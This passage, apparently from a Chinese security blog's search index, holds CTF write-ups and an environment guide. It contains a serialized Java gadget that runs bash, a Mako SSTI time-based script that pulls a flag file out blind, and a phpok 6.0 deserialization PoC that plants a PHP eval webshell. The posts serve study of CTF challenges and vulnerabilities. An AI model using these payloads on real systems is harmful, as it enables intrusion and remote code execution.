GluaXQ%2bAQADKClWBwAmAQAKU291cmNlRmlsZQEACWV2aWwuamF2YQwAGQAaBwAnDAAoACkBABBiYXNoIC90bXAvc3VhbnZlDAAqACsBAARldmlsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAADAAEABwAIAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAAMAAsAAAAgAAMAAAABAAwADQAAAAAAAQAOAA8AAQAAAAEAEAARAAIAEgAAAAQAAQATAAEABwAUAAIACQAAAEkAAAAEAAAAAbEAAAACAAoAAAAGAAEAAAAOAAsAAAAqAAQAAAABAAwADQAAAAAAAQAOAA8AAQAAAAEAFQAWAAIAAAABABcAGAADABIAAAAEAAEAEwABABkAGgACAAkAAABAAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAIACgAAAA4AAwAAABAABAAUAA0AFgALAAAADAABAAAADgAMAA0AAAASAAAABAABABsAAQAcAAAAAgAdcHQAEkhlbGxvVGVtcGxhdGVzSW1wbHB3AQB4dXIAEltMamF2YS5sYW5nLkNsYXNzO6sW167LzVqZAgAAeHAAAAABdnIAHWphdmF4LnhtbC50cmFuc2Zvcm0uVGVtcGxhdGVzAAAAAAAAAAAAAAB4cHNyABFqYXZhLnV0aWwuVHJlZU1hcAzB9j4tJWrmAwABTAAKY29tcGFyYXRvcnQAFkxqYXZhL3V0aWwvQ29tcGFyYXRvcjt4cHB3BAAAAAB4eHQAAzEyM3g%3d 反序列化 baby gadget v2.0’ revengeStatus: CompletedTag: WEB 相关资料/地址 同上题 HTML practicemako ssti 不出网盲注 123% for i in range(0,self.module.runtime.util.os.system(set(pageargs.values()).pop())):123% endfor 当命令执行成功 则显示123 否则 显示多个123 123456789101112131415161718192021222324import requestsimport stringimport urllib.parseurl=&quot;http://124.71.178.252/view/vnA8UID0QS7X2FtwsBTop15HNm6hfzbx.html?name=&quot;payload1=&quot;sleep $(cat /flag|base64 -w0|cut -c {}|tr {} 5)&quot;payload1 =&quot;&quot;&quot;if [ $(printf &quot;%d&quot; &quot;'$(cat /flag|cut -c {})&quot;) -eq {} ];then sleep 3;fi&quot;&quot;&quot;# payload2=&quot;if test $(cat /flag|cut -c {}) = {};then sleep 3;fi&quot;s=string.ascii_letters+string.digits+'{@~^*_+-\\'\\&quot;?/\\\\&lt;&gt;}'# s = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;flag=''for i in range(7,100): f=flag for j in range(48,128): try: u=url+urllib.parse.quote(payload1.format(str(i),j)) r=requests.get(u,timeout=1.8) except requests.exceptions.ReadTimeout as e: flag=flag+chr(j) print(chr(j)) break if f==flag: breakprint(flag) 断断续续跑n次","link":"/2022/03/01/SUSCTF2022-web-writeup/"},{"title":"phpok6.0-前台反序列化漏洞getshell","text":"0x0 前言这两天来杭州打西湖论剑了，一个低版本的phpok一个高版本的phpok 低版本nday通了 高版本一直没审计出来 今天上午在安恒大厦听了讲解 主办方说不公开了 但是有人做出来了 互联网上很快就会有题解了。 看到了poc大概的样子 回合肥路上调了一下 0x1 避坑最新版的phpok直接搭建跑不起来 可能是因为我mac？ 复现的师傅们可以把这里注释一下（我懒 不想找原因 0x2 思路大概看了一下逻辑 这个框架 c是控制器 f是方法 代码都在framework 文件夹下面，如图 framework/admin/login_control.php的 index_f方法 对应的url就是 /admin.php?c=login&amp;f=index 主办方那个url我看到了 是admin.php?c=login&amp;f=update 跟进去看了一眼代码 可疑点就在decode 跟进发现反序列化 。。。简单的有点离谱 还是吃了习惯看前台控制器的亏…. 以后多细心点吧 （此处响起了k👴👴r的声音：你为什么不会？还不是因为你菜 0x3 poc把token和file对应的文件复制过来 1234567891011121314151617181920&lt;?phprequire &quot;./token.php&quot;;require &quot;./file.php&quot;;class cache{ protected $key_id='suanve'; protected $key_list='aaaaaIDw/cGhwIGV2YWwoJF9QT1NUW29zd29yZF0pOz8+'; protected $folder='php://filter/write=string.strip_tags|convert.base64-decode/resource=';}//echo base64_encode(serialize(new cache()));$token = new token_lib();$file = new file_lib();$keyid = $file-&gt;cat(&quot;./index.php&quot;);$token-&gt;keyid($keyid);echo $token-&gt;encode(new cache()); 上车的时候掏电脑开始看的,写好这篇博客到丽水站了….比赛的时候我可是审到早上3点啊….","link":"/2022/03/13/phpok6-0-%E5%89%8D%E5%8F%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Egetshell/"},{"title":"dash分析-0x0环境搭建","text":"0x0前言虎符比赛遇到了一题极其类似p神做过的题，只是底层操作系统是Debian，无法使用p神的思路解决。 本着遇到了就调一调的精神 尝试了一下调试 验证p神的操作 也试着“完成p神未完成之路” 调试所需环境: Macos CLion Vscode php 1&lt;?php (empty($_GET[&quot;env&quot;])) ? highlight_file(__FILE__) : putenv($_GET[&quot;env&quot;]) &amp;&amp; system('echo hfctf2022');?&gt; nginx/default.php 1234567891011121314server { listen 80 default_server; listen [::]:80 default_server; root /var/www/html; index index.html index.htm index.nginx-debian.html; server_name _; location / { try_files $uri $uri/ =404; } location ~ \\.php$ { include snippets/fastcgi-php.conf; fastcgi_pass 127.0.0.1:9000; }} Dockerfile 1234567891011121314151617181920212223FROM php:7.4.28-fpm-busterLABEL Maintainer=&quot;yxxx&quot;ENV REFRESHED_AT 2022-03-14ENV LANG C.UTF-8RUN sed -i 's/http:\\/\\/security.debian.org/http:\\/\\/mirrors.163.com/g' /etc/apt/sources.listRUN sed -i 's/http:\\/\\/deb.debian.org/http:\\/\\/mirrors.163.com/g' /etc/apt/sources.listRUN apt upgrade -y &amp;&amp; \\ apt update -y &amp;&amp; \\ apt install nginx -yENV DEBIAN_FRONTEND noninteractiveCOPY index.php /var/www/htmlCOPY default.conf /etc/nginx/sites-available/defaultCOPY flag /flagEXPOSE 80CMD php-fpm -D &amp;&amp; nginx -g 'daemon off;' 0x1源码获取https://command-not-found.com/ 这个网站可以输入命令来获取该命令对应的软件包 比如我们输入echo 可以发现网站提示了在各种编程语言下获取该软件的方式 因为赛题环境是debian我们前往Debian Package搜索coreutils 搜索后会发现Debian Package提供了完整匹配和部分匹配的软件包地址 点击完整匹配对应的软件包路径 可以看到网站右侧即可下载源码 如果我们想确定我们目标环境中coreutils的版本 可以使用dpkg -l的方式来检索软件包版本 0x2dash调试环境搭建dash源码获取途径如0x1节 解压后进入目录 cd /Users/su/Desktop/code/c/dash-0.5.10.2/ 我们首先编译dash 并添加调试符号 123CFLAGS=&quot;-g&quot; ./configure --prefix=/Users/su/Desktop/code/c/dash-0.5.10.2/ &amp;&amp; \\make &amp;&amp; \\make install 等待编译完成后在当前目录下会出现bin目录 目录中存放着dash的可执行文件 运行一下测试 我们需要在vscode中安装c/c++扩展 随后在Debug菜单中选择创建launch.json 然后选择C++(GDB/LLDB) 在生成的json文件中添加调试信息 1234567891011121314151617181920212223242526{ // 使用 IntelliSense 了解相关属性。 // 悬停以查看现有属性的描述。 // 欲了解更多信息，请访问: https://go.microsoft.com/fwlink/?linkid=830387 &quot;version&quot;: &quot;0.2.0&quot;, &quot;configurations&quot;: [{ &quot;name&quot;: &quot;Debug&quot;, &quot;type&quot;: &quot;cppdbg&quot;, &quot;request&quot;: &quot;launch&quot;, &quot;program&quot;: &quot;/Users/su/Desktop/code/c/dash-0.5.10.2/bin/dash&quot;, //这里指向编译好的文件 &quot;args&quot;: [ // 这里是运行时的参数。因为赛题执行了dash -c 'echo xxxx' 所以需要配置一下 &quot;-c&quot;, &quot;echo suanve&quot; ], &quot;stopAtEntry&quot;: false, &quot;cwd&quot;: &quot;${fileDirname}&quot;, &quot;environment&quot;: [ { &quot;name&quot;: &quot;test&quot;, &quot;value&quot;: &quot;test&quot; }, ], &quot;externalConsole&quot;: false, &quot;MIMode&quot;: &quot;lldb&quot; }]} 配置完成保存 打开src/main.c找到主函数下一个断点 点击调试即可断在main函数","link":"/2022/03/21/dash%E5%88%86%E6%9E%90-0x0%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"}],"tags":[{"name":"php","slug":"php","link":"/tags/php/"},{"name":"代码审计","slug":"代码审计","link":"/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"pbootcms","slug":"pbootcms","link":"/tags/pbootcms/"},{"name":"ctf","slug":"ctf","link":"/tags/ctf/"},{"name":"SUSCTF2022","slug":"SUSCTF2022","link":"/tags/SUSCTF2022/"},{"name":"EDISEC","slug":"EDISEC","link":"/tags/EDISEC/"},{"name":"dash","slug":"dash","link":"/tags/dash/"},{"name":"vscode","slug":"vscode","link":"/tags/vscode/"},{"name":"调试","slug":"调试","link":"/tags/%E8%B0%83%E8%AF%95/"}],"categories":[{"name":"代码审计","slug":"代码审计","link":"/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"ctf","slug":"ctf","link":"/categories/ctf/"},{"name":"二进制","slug":"二进制","link":"/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/"}]}